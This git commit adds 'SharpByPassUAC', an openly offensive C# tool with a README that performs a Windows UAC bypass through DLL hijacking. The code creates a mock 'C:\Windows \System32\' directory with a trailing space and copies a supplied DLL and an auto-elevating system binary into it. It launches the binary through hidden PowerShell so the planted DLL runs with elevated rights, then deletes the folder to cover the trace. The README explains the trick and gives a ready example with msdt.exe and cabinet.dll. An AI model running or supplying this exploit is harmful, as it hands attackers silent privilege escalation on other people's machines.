cede4a17f5ded58ce2f8a945b016ce51d398b98a
HopHouse <contact@qro.me>
2021-08-22 23:40:41 +0200

    Initial commit with version 1.0

---
+++ Program.cs
@@ -0,0 +1,99 @@
+﻿using System;
+using System.IO;
+using Pastel;
+using System.Drawing;
+using CommandLine;
+
+namespace SharpByPassUAC
+{
+    class Program
+    {
+        class Options
+        {
+            [Option("dll", Required = true,
+              HelpText = "Input dll file to be processed.")]
+            public string InputDLL { get; set; }
+
+            [Option("binary",
+              Required = true,
+              HelpText = "Binary file to execute in order to trigger the UAC bypass.")]
+            public string InputBinary { get; set; }
+        }
+        private static readonly int ExitCodeError = 1;
+
+        static private byte[] GetBytesFromFile(string path)
+        {
+            byte[] dllContent = { };
+            try
+            {
+                dllContent = File.ReadAllBytes(path);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[!] Could not find the file {0}", path.Pastel(Color.Gold));
+                Console.WriteLine(e.ToString());
+                Environment.Exit(ExitCodeError);
+            }
+
+            return dllContent;
+        }
+
+        static void Main(string[] args)
+        {
+            var options = new Options();
+
+            _ = Parser.Default.ParseArguments<Options>(args)
+                .WithParsed(RunOptions);
+        }
+
+        static void RunOptions(Options opts)
+        {
+            Console.WriteLine("[+] ByPassUAC");
+
+            string directory = @"C:\Windows \System32\";
+            try {
+                _ = Directory.CreateDirectory(directory);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[!] Error creating the folder {0}.", directory.Pastel(Color.Gold));
+                Console.WriteLine("{0}", e);
+                Environment.Exit(1);
+            }
+            Console.WriteLine("[+] Created the folder {0}.", directory.Pastel(Color.Gold));
+
+            string dllTarget = string.Format(@"{0}{1}", directory, Path.GetFileName(opts.InputDLL));
+            Console.WriteLine("[+] Copy the DLL {0} to {1}.", opts.InputDLL.Pastel(Color.Gold), dllTarget.Pastel(Color.Gold));
+            File.Copy(opts.InputDLL, dllTarget, true);
+
+            string binaryTarget = string.Format(@"{0}{1}", directory, Path.GetFileName(opts.InputBinary));
+            Console.WriteLine("[+] Copy the binary {0} to {1}.", opts.InputDLL.Pastel(Color.Gold), binaryTarget.Pastel(Color.Gold));
+            File.Copy(opts.InputBinary, binaryTarget, true);
+
+            Console.WriteLine("[+] Run the binary {0} to trigger the code execution with UAC ByPass.", binaryTarget.Pastel(Color.Gold));
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.RedirectStandardOutput = true;
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "powershell.exe";
+            startInfo.Arguments = string.Format("Start-Process '{0}' -Verb RunAs", binaryTarget);
+            process.StartInfo = startInfo;
+            process.Start();
+            string result = process.StandardOutput.ReadToEnd();
+            //Console.WriteLine("[+] Output :\n{0}", result.Pastel(Color.Gold));
+
+
+            try
+            {
+                Directory.Delete(@"C:\Windows \", true);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[!] Error deleting the folder {0}.", @"C:\Windows \".Pastel(Color.Gold));
+                Console.WriteLine("{0}", e);
+                Environment.Exit(1);
+            }
+            Console.WriteLine("[+] Deleting the folder {0}.", @"C:\Windows \".Pastel(Color.Gold));
+        }
+    }
+}
---
+++ Readme.md
@@ -0,0 +1,35 @@
+# SharpByPassUAC
+
+Tool to leverage a famous UAC bypass and execute the code located inside a DLL.
+
+The tool leverages DLL hijacking vulnerabilities of Microsoft executables located into `C:\Windows\System32\`. It leverages the fact that it is possible to create a folder containing a space like `C:\Windows\System32 \` (note de space after `System32`). When Microsoft executable look for missing DLL, they will it our created folder before `System32` and then having our custom DLL loaded. 
+
+If it is weaponized, the code inside will be executed. 
+
+Custom DLL can be created will [SharpDLLProxy](https://github.com/HopHouse/SharpDLLProxy) in order to be directly used.
+
+## Example
+The executable `msdt.exe` is prone to a DLL Hijacking vulnerability with the DLL `cabinet.dll`
+
+```
+C:\> SharpByPassUAC.exe --binary C:\\Windows\\System32\\msdt.exe --dll  C:\\Users\\administrator\\Desktop\\cabinet.dll
+```
+
+## Help
+```
+SharpByPassUAC 1.0.0
+Copyright (C) 2021 SharpByPassUAC
+
+ERROR(S):
+  Option 'h' is unknown.
+  Required option 'dll' is missing.
+  Required option 'binary' is missing.
+
+  --dll        Required. Input dll file to be processed.
+
+  --binary     Required. Binary file to execute in order to trigger the UAC bypass.
+
+  --help       Display this help screen.
+
+  --version    Display version information.
+```
